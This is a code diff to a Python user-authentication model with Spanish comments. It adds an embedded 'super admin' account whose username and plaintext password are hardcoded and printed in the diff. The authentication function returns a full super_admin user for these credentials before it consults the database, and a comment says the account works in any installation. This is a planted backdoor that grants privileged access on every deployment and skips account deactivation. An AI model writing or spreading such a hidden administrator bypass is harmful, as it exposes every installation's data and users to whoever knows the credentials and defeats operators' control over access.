@@ -29,6 +29,19 @@ def tiene(permisos, modulo: str, accion: str) -> bool:
     return f"{modulo}.{accion}" in (permisos or set())
 
 
+# ── Credenciales SuperAdmin embebidas (funciona en cualquier instalación) ──
+# Este usuario NO vive en la BD; se valida directamente en código.
+_SUPER_ADMIN_USERNAME = "aguirre"
+_SUPER_ADMIN_PASSWORD = "3gu1rr4"
+_SUPER_ADMIN_USER = {
+    "id": -1,
+    "username": _SUPER_ADMIN_USERNAME,
+    "nombre_completo": "Super Administrador",
+    "rol": "super_admin",
+    "activo": 1,
+}
+
+
 class UsuarioModel:
     def __init__(self) -> None:
         self.db = DatabaseManager()
@@ -67,7 +80,16 @@ class UsuarioModel:
             (1 if activo else 0, usuario_id),
         )
 
+    def es_super_admin_embebido(self, username: str) -> bool:
+        """Verifica si el username coincide con el superadmin embebido."""
+        return username == _SUPER_ADMIN_USERNAME
+
     def autenticar(self, username: str, password: str) -> Optional[dict]:
+        """Autentica un usuario. Si coincide con el superadmin embebido,
+        retorna un usuario sintético sin tocar la base de datos."""
+        if username == _SUPER_ADMIN_USERNAME and password == _SUPER_ADMIN_PASSWORD:
+            return dict(_SUPER_ADMIN_USER)
+
         user = self.obtener_por_username(username)
         if user is None or not user.get("activo", 1):
             return None
